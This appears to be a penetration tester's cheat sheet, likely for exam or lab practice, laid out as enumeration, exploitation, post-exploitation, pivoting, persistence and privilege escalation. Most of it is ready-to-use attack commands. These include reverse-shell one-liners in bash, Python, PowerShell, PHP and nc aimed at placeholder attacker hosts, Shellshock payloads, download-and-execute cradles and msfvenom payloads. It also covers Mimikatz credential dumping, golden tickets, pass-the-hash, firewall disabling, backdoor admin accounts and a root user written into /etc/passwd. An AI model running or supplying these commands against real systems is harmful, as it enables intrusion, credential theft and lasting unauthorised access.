# Enumeration
## High-level scan
```
nmap -p- <IP>
rustscan --ulimit 5000 -a <IP>
```
## Detailed scan
```
nmap -A -sC -p<OPEN PORTS> <IP>
```
## Host
## Services
#### XXX/tcp (Service unkown)
```
amap -d <IP> <PORT>
```
#### 21/tcp (FTP)
```
ftp <IP>
```
- Always try ***anonymous:anonymous***
```
nc <IP> 21
```
- *Remember - if you upload a binary file, you must put the server in ==binary mode== otherwise it will become corrupted and not work.  If you're uploading a text-file, you must use ==ascii-mode==.  Use `binary` and `ascii` to switch modes*
#### 22/tcp (SSH)
```
nc <IP> 22
```
#### 23/tcp (Telnet)
#### 25/tcp (SMTP)
- Possible commands :
```
HELO - 
EHLO - Extended SMTP.
STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.
RCPT - Address of the recipient.
DATA - Starts the transfer of the message contents.
RSET - Used to abort the current email transaction.
MAIL - Specifies the email address of the sender.
QUIT - Closes the connection.
HELP - Asks for the help screen.
AUTH - Used to authenticate the client to the server.
VRFY - Asks the server to verify is the email user's mailbox exists.
```
- Connecting to SMTP
```
nc <IP> 25
telnet <IP> 25
```
- Enumerating SMTP
```
nmap -script smtp-commands.nse <IP>
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t <IP>
# -M for mode, -U for userlist, -t for target
```
#### 53/tcp/udp (DNS)
- Zone Transfers
```
host -l thinc.local <IP> # Host Zone Transfer
dnsrecon -d thinc.local -n 100.123.216.23 -axfr # dnsrecon zone transfer
dig axfr @<DNS_IP> # Dig zone transfer without domain
```
- Subdomain enumeration
```
# dnsrecon
dnsrecon -a -dd <DOMAIN> -n <IP> -t brt
# subfinder; use -silent to only have subdomains in the output
./subfinder-linux-amd64 -d tesla.com [-silent]
# findomain, use -silent to only have subdomains in the output
./findomain-linux -t tesla.com [--quiet]
# ffuf
ffuf -c -w /path/to/wordlist -u http://victim.com -H "Host: FUZZ.victim.com"
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100
# gobuster 
gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt
```
- Reverse DNS lookups
```
# Find more domains in the scope
dnsrecon -r <DNS Range> -n <IP_DNS>   #DNS reverse of all of the addresses
dnsrecon -d facebook.com -r 157.240.221.35/24 #Using facebooks dns
dnsrecon -r 157.240.221.35/24 -n 1.1.1.1 #Using cloudflares dns
dnsrecon -r 157.240.221.35/24 -n 8.8.8.8 #Using google dns
```
#### 80/tcp (HTTP)
- nmap enumeration
```
nmap --script=http-vuln* -p80 -T4 -Pn <IP>
```
- cURL
```
curl -s -I http://<IP>:<PORT> # get HTTP header
curl -v -X OPTIONS http://<IP> # check file upload
```
- gobuster
```
gobuster dir -e -u http://<IP>:<port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .asp,.aspx,.txt,.php,.sh,.html,.htm 
# Use with -k for SSL
```
- dirbuster
- nikto
```
# For SSL, use with -k
nikto -h http://<IP>
nikto -h http://<IP> -p <port>
nikto -h http://<IP> -root /<newstartdir>
```
- dav (file upload)
```
davtest -url http://<IP> # Check File Upload
```
- CMS scanning
```
wpscan --url http://<IP> --enumerate p,u | tee wpscan-core # Wordpress
wpscan --url sandbox.local --enumerate ap,at,cb,dbe # Wordpress
droopescan scan drupal -u http://100.123.216.23 -t 32 # Droopal
```
- Cadaver
```
cadaver http://<IP>
```
#### 88/tcp (Kerberos)
- Kerberoasting
```
.\GetUserSPNs.ps1  #Get Service Principal Name 

#Request Kerberos ticket, that is saved to memory
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""MSSQLSvc/xor-app23.xor.com:1433""

#use mimikatz to dump the kerberos tickets
kerberos::list /export

#extract the kerberos ticket in John format
kirbi2john.py '3-40a10000-xor-app59$@MSSQLSvc~xor-app23.xor.com~1433-XOR.COM.kirbi' >johnkertickethash

#Crack the password from the Kerberos ticket
john --wordlist=/usr/share/wordlists/rockyou.txt   johnkertickethash
We now have the password for the account sqlserver"
```
- Getting TGTs for Users (Do not require Kerberos pre-authentication)
```
/usr/share/doc/python-impacket/examples/GetSPNUsers.py  {domain}/ -no-pass -usersfile users.txt  -dc-ip <IP>
```
#### 110/tcp (POP3)
```
telnet <IP> <PORT>
USER <user@IP>
PASS <passwd>
list #list all emails
retr 5 #retrieve email (in this example, email 5)
```
#### 111/tcp (Rpcbind)
```
rpcbind -p <IP>
```
#### 135/tcp (MSRPC)
- scanning with nmap 
```
nmap <IP> --script=msrpc-enum
nmap -p139,445 <IP>
nmap -p139,445 <IP> --script smb-enum-shares.nse smb-os-discovery.nse
```
- Useful NSE scripts
```
/usr/share/nmap/scripts/smb-brute.nse
/usr/share/nmap/scripts/smb-enum-domains.nse
/usr/share/nmap/scripts/smb-enum-groups.nse
/usr/share/nmap/scripts/smb-enum-processes.nse
/usr/share/nmap/scripts/smb-enum-sessions.nse
/usr/share/nmap/scripts/smb-enum-shares.nse
/usr/share/nmap/scripts/smb-enum-users.nse
/usr/share/nmap/scripts/smb-flood.nse
/usr/share/nmap/scripts/smb-ls.nse
/usr/share/nmap/scripts/smb-mbenum.nse
/usr/share/nmap/scripts/smb-os-discovery.nse
/usr/share/nmap/scripts/smb-print-text.nse
/usr/share/nmap/scripts/smb-psexec.nse
/usr/share/nmap/scripts/smb-security-mode.nse
/usr/share/nmap/scripts/smb-server-stats.nse
/usr/share/nmap/scripts/smb-system-info.nse
/usr/share/nmap/scripts/smbv2-enabled.nse
/usr/share/nmap/scripts/smb-vuln-conficker.nse
/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
/usr/share/nmap/scripts/smb-vuln-ms06-025.nse
/usr/share/nmap/scripts/smb-vuln-ms07-029.nse
/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
/usr/share/nmap/scripts/smb-vuln-ms10-054.nse
/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
```
- Connecting to an smb-share
```
smbclient -L <IP>
smbclient //<IP>/<directory>
smbclient \\\\<IP>\\<SHARE> -U <USER>
smbclient //<IP>/<SHARE> -U <USER>
```
- Mounting a share
```
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//<IP>/<SHARE>" /mnt/cifs
```
#### 139/tcp (NetBIOS) / 445/tcp (SMB)
```
nmblookup -A <IP>
nbtscan <IP>/30
sudo nmap -sU -sV -T4 --script nbstat.nse -p139 -Pn -n <IP>
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>
```
- rpc
```
rpcclient -U "" -N <IP> # No creds
rpcclient //<IP> -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> # With creds
- Once connected via rpc, you can use commands like :
	- 	querydominfo
	- 	enumdomusers
	- 	getdompwinfo
	- 	srvinfo
	- 	netshareenum
	- 	netshareenumall
```
- Impacket
	- Dump User Information
```
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
	- Map possible RPC endpoints
```
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
#### 143/tcp (IMAP)
#### 161/tcp (SNMP)
- ***NOTE*** : SNMP uses the word *community* instead of the word *password*.
	- Common community strings : `public` `private` `community`
- enumeration
```
nmap -iL <IP LIST> -p161,162 -sU --open -vvv snmp-nmap.txt
snmpwalk -c public -vi <IP> # community string and which version
snmp-check -t <IP> -c <COMMUNITY STRING>
onesixtyone <IP> -c /usr/share/doc/onesixtyone/dict.txt
```
- locations of things we may care about : 
```
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```
#### 389/tcp (LDAP)
- ldapsearch
```
ldapse4arch -h <IP> -p 389 -x -b "dc=mywebsite,dc=com"
```
#### 443/tcp (HTTPS)
- Determine if a page is vulnerable to ***heartbleed***
```
sudo sslscan <IP>:443
nmap -sV --script=ssl-heartbleed <IP>
```
- With the data from the above enumeration, read the certificate.
	- Does it include names that might be useful ?
	- Correct vHost ?
#### 1433/tcp (MSSQL)
- Enumeration
```
nmap -p1433 -Pn -T4 --script ms-sql-info,ms-sql-ntlm-info <IP>
nmap -p27900 -sV --script ms-sql-tables,ms-sql-xp-cmdshell,ms-sql-hasdbaccess,ms-sql-dump-hashes,ms-sql-config,ms-sql-query --script-args mssql.username=sa,mssql.password=password -Pn -T4 <IP>
```
```
sqsh -S <IP> -U sa
```
```
xp_cmdshell 'date' # To execute the date command to the following after logging in
go
```
#### 1521/tcp (Oracle SQL)
- [Hacktricks is a great place to start](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
- Enumeration
```
python3 odat.py all -s <IP> -p 1521
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
tnscmd10g version -p 1521 -h <IP>
tnscmd10g status -p 1521 -h <IP>
```
- Connect to the database with `sqlplus`
- Default PWs
	- DBSNMP/DBSNMP — Intelligent Agent uses this to talk to the db server (its some work to change it)
	- SYS/CHANGE_ON_INSTALL — Default sysdba account before and including Oracle v9, as of version 10g this has to be different!
	- PCMS_SYS/PCMS_SYS — Default x account
	- WMSYS/WMSYS — Default x account
	- OUTLN/OUTLN — Default x account
	- SCOTT/TIGER — Default x account
- Login using known creds
```
sqlplus <username>/<password>@<ip_address>/<SID>;
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
```
```
oscanner -s <IP> -P <PORT>
```
#### 2049/tcp (NFS)
- Enumerate the filesystem being shared
```
nmap -Pn -T4 -sV --script nfs-showmount <IP>
showmount -e <IP>
```
- Mount the filesystem
```
mount <IP>:/ /tmp/NFS
mount -t <IP>:/ /tmp/NFS
```
#### 3306/tcp (MySQL)
- ***ALWAYS*** test `root:root`
- Enumeration
```
nmap -p3306 -Pn -T4 --script mysql-info <IP>
nmap -p3306 -sV --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 --script-args mysqluser=root,mysqlpass=toor -Pn -T4 <IP>
```
- MySQL Commands
```
mysql --host=<IP> -u root -p
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
mysql -h <Hostname> -u ""@localhost

telnet 192.168.0.101 3306
```
- Config Files
```
vim /etc/my.cnf
```
#### 3389/tcp (RDP)
```
rdesktop -u <USER> -p <PASS> <IP> -g 94%  # -g is the size of the gui
```
#### 8080/tcp (HTTP/S)
#### 47001/tcp (WinRMS - Windows Remote Mgmt Svc)
## SW version
# Exploitation
## Exploitation summary
#### Shellshock
- Can find shellshock vulns with `nikto` and with `nmap`
```
nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi,cmd='/bin/bash -i >& /dev/tcp/<ATTACKIP>/<AttackLISTENER> 0>&1' <VICTIMIP>
```
- Can exploit shellshock vulns using `Burp` or `cURL`
```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKIP>/<AttackLISTENER> 0>&1' http://<VICTIMIP>
```
#### Windows File transfer
- Powershell One-liner
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<ATTACKIP>/mimikatz.exe', 'C:\TEMP\mimikatz.exe')
```
- wget.exe
```
wget.exe http://<ATTACKIP>:1234/ --recursive --no-parent
wget.exe -O shell.exe http://<ATTACKIP>:1234/
```
- curl.exe
```
curl.exe -O http://<ATTACKIP>:1234
```
- certutil.exe
```
certutil.exe -urlcache -f http://<IP>:<PORT>/<FILENAME> <LOCAL FILENAME>
certutil.exe -urlcache -split -f http://<IP>:<PORT>/<FILENAME>
```
#### Linux File Transfer
#### File Inclusion
- LFI
- RFI
#### Reverse Shells
- Pyhon reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKIP>",<AttackLISTENER>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Python TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
- SMB server reverse shell
```
\\\\10.10.14.16\\SMB\\nc.exe <IP> <PORT> -e cmd.exe
```
- Powershell reverse shells
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.171',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" # non-interactive socket connection
```
```
start-process powershell -argumentlist ""IEX(New-Object Net.WebClient).downloadString('http://<IP>/Invoke-PowerShellTcp.ps1')"" -credential $cred
$password = ConvertTo-SecureString 'aliceishere' -ASPLainText -Force 
{$cred = New-Object System.Management.Automation.PSCredential('Alice',$password)}
```
```
powershell -command "((new-object System.Net.WebClient).DownloadFile('http://10.10.14.16:1234/whoami.exe', '%TEMP%\whoami.exe'))"; "c:\windows\system32\cmd.exe /c %TEMP%\whoami.exe" # Download and execute reverse shell
```
```
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.11.0.253/Invoke-PowerShellTcp.ps1')|iex" # Download and execute interactive reverse shell
```
```
powershell.exe IEX(New-Object Net.WebClient).downloadString('192.168.119.171/Invoke-PowerShellTcp.ps1') 
# Serve up Invoke-PowerShellTcp.ps1 on an http server after adding the following line to the very bottom of the file, pointing to your nc listener:
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.171 -Port 6666
# You can note the activity on your http server to confirm network activity
```
- BASH reverse shells
```
bash -c 'exec bash -i &>/dev/tcp/<ATTACKIP>/<AttackLISTENER> <&1'
```
- nc reverse shells
```
rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> > /tmp/f
nc -nv <IP> <PORT> -e /bin/bash 
```
- PHP reverse shell
```
php -r '$sock=fsockopen(getenv("<ATTACKIP>"),getenv("<AttackLISTENER>"));exec("/bin/sh -i <&3 >&3 2>&3");'
<?php shell_exec("bash -i >& /dev/tcp/<ATTACKIP>/<AttackLISTENER> 0>&1"); ?>
<?php `bash -i >& /dev/tcp/<ATTACKIP>/<AttackLISTENER> 0>&1` ?>  
<?php passthru("bash -i >& /dev/tcp/<ATTACKIP>/<AttackLISTENER> 0>&1");?>
```
- msfvenom reverse shell
```
# aspx reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKIP> LPORT=<AttackLISTENER> -f aspx > reverse.aspx # aspx -- think IIS servers

# Powershell reverse shell
msfvenom -a x86 -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://<ATTACKIP>/Invoke-PowerShellTcp.ps1')" 

# shellcode, C -encoded -x86
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKIP> LPORT=<AttackLISTENER> exitfunc=thread -f c -e x86/shikata_ga_nai -b '\x00' 

# WAR reverse Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKIP> LPORT=<AttackLISTENER> -f war > warrshell443.war

# jsp reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKIP> LPORT=<AttackLISTENER> -f raw > jsprshell443.jsp

# exe reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKIP> LPORT=<AttackLISTENER> -f exe -o winrshell4443.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKIP> LPORT=<AttackLISTENER> -f exe -o winrshell4443.exe

# dll reverse shell
msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKIP> LPORT=<AttackLISTENER> -f dll -o shell-cmd.dll

# php reverse shell
msfvenom -p php/shell_php LHOST=<ATTACKIP> LPORT=<AttackLISTENER> -O shell.php
```
#### PATH variables
- Add to the PATH variable to run commands from /tmp, for example
```
export PATH=$PATH:/tmp
export PATH=/tmp:$PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
```
#### Compiling exploits
```
# cross-compile 32-bit
i686-w64-mingw32-gcc 40564.c -lws2_32 -o 40564.exe #the -lws2_32 switch tells is that its meant for 32 bit OS
# cross-compile 64-bit
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
i686-w64-mingw32-gcc exploit.c -o exploit.exe 
```
## Exploitation Link/source
# Post-Ex
## Windows Enumeration
#### PowerView.ps1 for Domain Enumeration
```
# This series of instructions starts once you've got an interactive session and PowerView.ps1 is uploaded to the victim machine
powershell -ep bypass # bypasses the execution policy.  Note the PS added to your command prompt
. .\PowerView.ps1 # Note, when you hit enter, you will not see any change besides carriage retrun
```
	- Get-NetDomain
```
Get-NetDomain # Gets info about the domain
Get-NetDomainController # Gets info about the DC
Get-DomainPolicy # Shows you all the policies in the domain.
(Get-DomainPolicy)."system acess" # Tells us more about the policies in the domain
```
	- Get-NetUser
```
Get-NetUser # Dumps a list of all the users and information about them
Get-NetUser | select cn # pulls down just a list of the users
Get-NetUser | select samaccountname # pulls down just a list of the account names
Get-NetUser | select description # pulls down a list of the the description
```
	- Get-UserProperty
```
Get-UserProperty # shows all the properties a user might have
Get-UserProperty -Properties pwdlastset # shows you the users and when they last set their pw
```
	- Get-NetComputer
```
Get-NetComputer # lists out all the computers in the domain
Get-NetComputer -FullData # gives you more infomration than you need about every computer in the domain
Get-NetComputer -FullData | select OperatingSystem #sorts by operating system
```
	- Get-NetGroup
```
Get-NetGroup # Enumerate groups
Get-NetGroup -GroupName "Domain Admins" # Sorts the data by groups
Get-NetGroup -GroupName *admin* # Sorts by any group with admin in the name
Get-NetGroupMember -GroupName "Domain Admins" # list out every member of a group
```
	- Invoke-ShareFinder and Get-NetGPO
```
Invoke-ShareFinder # enumerate all the smb shares in the network, as well as what files are being share and where they're being shared
Get-NetGPO #shows us all the group policies
Get-NetGPO | select displayname, whenchanged #show the policy name and when they were changed
```
#### System Enumeration (Manual)
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" #system information
wmic qfe get Caption,Description,HotFixID,InstalledOn # quick fix engineering
wmic logicaldisk get caption,description,providername # drive enumeration
```
- Unquoted Service Paths
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v 

sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
type path.txt | findstr /v svchost.exe

sc query 
sc qc <servicename>    # note this is qc and not query
```
- Windows Auto Login Password
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# AutoAdminLogon = “1” Enabled  (Zero would mean turn off)
# DefaultUserName = “SomeUser” (Your logon username)
# DefaultPassword = “Pa$$w0rd” (Remember this or change)
# DefaultDomainName = “domain.lan”  (Only needed if this computer has joined a domain)
```
- Searching for Cleartext Passwords
```
# Search for Cleartext passwords in specific fiel types
cd C:\ & findstr /si "password" *.xml *.ini *.txt *.config
cd C:\ & findstr /spin "password" *.*
# p is to ignore non-printable and n is to show line number"

# Search for cleartext passwords in registry keys
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\ORL\WinVNC4\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Credential Manager
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

# SAM and SYSTEM files (use samdump2 to analyze what you can save)
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
C:\> reg.exe save hklm\security c:\windows\temp\security.save
C:\> reg.exe save hklm\system c:\windows\temp\system.save
```
- File Permissions 
```
icacls <directory>
```
#### Network Enumeration (Manual)
```
netstat -ano # Check Network Comms
net share # list shares and their local path
net user /domain alex # Check User
net user <username> # see information for a given user
net localgroup # enumerate local groups
whoami /priv # Look for things like SeImpersonatePrivilges
```
- Turn off firewall
```

NetSh Advfirewall set allprofiles state off # Turn off the firewall
```
## Windows AD Attacking
#### Bloodhound for enumerating AD and visualize potential attack chains
- Bloodhound Install and neo4j setup
```
sudo apt install bloodhound
# Bloodhound runs on a tool called neo4j, so set that up
neo4j console # enter this and it will direct you to a localhost:port to access and change the default creds neo4j:neo4j.  Can close the browser.
bloodhound # in teh terminal, it opens up the browser and gives you a green checkmark if you're connected to the DB.  You should see "NO DATA RETURNED FROM QUERY"
```
	- Pull data with an ingestor
```
# can use Invoke-BloodHound from PowerShell or SharpHound

Google search "Invoke-Bloodhound" 
# https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collector
# https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1

Take the SharpHound file and put it on your victim machine
powershell -ep bypass
. .\SharpHound.ps1 # Activates the Ingestor
Invoke-BloodHound -CollectionMethod All -Domain <DomainName> -ZipFileName <file.zip> # This commend is collecting all teh data. Get the file.zip file over to the attack machine
```
	- Enumerating Domain DAta wiht Bloodhound
```
- Upload Data in your webPortal using the menu on the right.  Upload the file.zip
- Click the hamburger on the left of the screen next to the input field.
- Move over to queries and select "Find All Domain Admins" and go through each query. Pay attention to "Find Shortest Paths to Domain Admins"
```
#### Mimikatz
	- Credential dumping with Mimikatz (https://github.com/gentilkiwi/mimikatz/wiki)

```
mimikatz.exe  # this requires an interactive shell
privilege::debug # looking for a Privelege '20' OK. This allows us to bypass the protections to access the memory, which is where mimikatz goes
sekurlsa::logonpasswords # gets logon users adn hashes. NTLM can be used in PtH but not NTLMv2
lsadump::sam or lsadump::sam /patch # attempts to dump the SAM file
lsadump::lsa /patch # dumping the lsa - local security authority
ntds.dit # will dump ntds file
```
- Golen Ticket Attacks
```
mimikatz.exe # need a Kerberos TGT, we can access any resource or system on the domain
privilege::debug # as always
lsadump::lsa /inject /name:krbtgt # pull down just one user
# Open up a notepad and copy the SID and teh NTLM hash of the kerberos TGT account
kerberos::golden /User:Administrator /domain:<domain> /sid:<SID from prev step> /krbtgt:<NTLM hash from prev step> /id:500 /ptt
misc::cmd # Opens up a new command prompt with the ticket 
dir \\<DOMAINUSER>\c$ # enumerate the directory of a domain user from our machine
# if we have psexec.exe downloaded to this machine, run it against the domain user in the previous step and you'll get a shell on that machine
psexec.exe \\<DOMAINUSER> cmd.exe
```
## Linux Enumeration
#### Automated Scripts
```
./LinEnum.sh -t    
./linpeas.sh
python Linprivchecker.py 
perl Linux_Exploit_Suggester.pl
python linexpchecker.py
./unix-privsc-check.sh standard
./lse.sh -l 1
```
#### System
- OS and kernels
```
uname -a
cat /etc/issue
cat /etc/redhat-release 
cat /etc/*-release
```
```
cat /etc/passwd
cat /etc/passwd | grep -v "/no/login" | grep -v "/bin/false" | grep -v "/nologin"
lastlog
```
```
find / \( -perm -g=s -o -perm -u=s \) -type f 2>/dev/null -print0 | xargs -0 ls -la
find / -perm -u=s -type f 2>/dev/null
```
#### Network
```
# Explore Home directory and file system
ls -lahR /root/
ls -lahR /home/
tree -a
# sudo
sudo -l
cat /etc/sudoers
sudo -i to exploit
# SUID/SGID
find / \( -perm -g=s -o -perm -u=s \) -type f 2>/dev/null -print0 | xargs -0 ls -la
find / -perm -u=s -type f 2>/dev/null
find / -type d -perm -o=w 2>/dev/null 
```
```
netstat -antp # Check Network Comms
netstat -antup # Check Network Comms, U for UDP
# world writeable files/folders
find / -perm -o=w -type f 2>/dev/null -print0 | xargs -0 ls -la 
```
```
# Passwords typed by the users
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```
## Pivot
- Port Forward with SSH
```
ssh -l root -pw password -R 445:<VICTIMIP>:445 <ATTACKIP>
# local port forwarding
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 # Local port 1521 accessible in port 10521 from everywhere
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
# Local port -> Compromised host (SSH) -> Third_box:port
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
# Local port -> Compromised host (SSH) -> Wherever
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
# Reverse Port forward (get rev shells from internal hosts thru DMZ to you)
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
### Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
### Note that port 443 must be open
### Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems 
### and change the line "GatewayPorts no" to "GatewayPorts yes"
### to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
- Port forwarding tools
```
# sshuttle
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa' # connect with a private key; -D : Daemon mode
# chisel
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
# plink.exe
plink.exe -l test -pw toto -R 445:<VICTIMIP>:445 <ATTACKIP>
plink.exe -R 445:<VICTIMIP>:445 <ATTACKIP>
```
## Persistance
- User Creation
```
PS C:\> net user bill P@ssw0rd123 /add
PS C:\> net localgroup administrators bill /add
PS C:\> net localgroup "Remote Desktop Users" bill /add
```
- Changing the system password
```
net user administrator Passw0rd!
```
# Privesc
## Windows
- WinPEAS
- JuicyPotato
- Automated tools
```
# Powerup.ps1
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
# gopher.ps1
powershell.exe -ExecutionPolicy Bypass -File .\gopher.ps1
# watson.exe
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
cd c:\Windows\Microsoft.NET\Framework & dir /A:D

To run, just type watson.exe
# sherlock.ps1
powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
# jaws-enum.ps1
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
# powerless.bat
powerless.bat
# windows-privesc-check2.exe
windows-privesc-check2.exe --audit -a -o wpc-report
# Windows-exploit-suggester.py
windows-exploit-suggester.py 
```
## Linux 
#### Adding a user to a world-writeable /etc/passwd file
```
# Generating a new user hash
openssl passwd -1 -salt salt password
$1$salt$qJH7.N4xYta3aEG/dfqo/0
```
```
# add user with root privs
echo "hacked:\$1\$salt\$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash" >> /etc/passwd
```
```
# su into the privileged user
su hacked
```
# Loot
## Creds
## Hashes
- Mimikatz
```
#on meterpreter
load mimikatz 
msv
kerberos
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::searchPasswords
```
- Impacket
```
# extract hashes
pwdump.py SYSTEM SAM 
# PtH
psexec.py -hashes :a9fdfa038c4b75ebc76dc855dd74f0da admin@100.123.216.23 cmd.exe
pth-winexe -U 'admin%LM:NTLM' //100.123.216.23 cmd.exe
```
#### Hashcracking
## Proof.txt / flag.txt
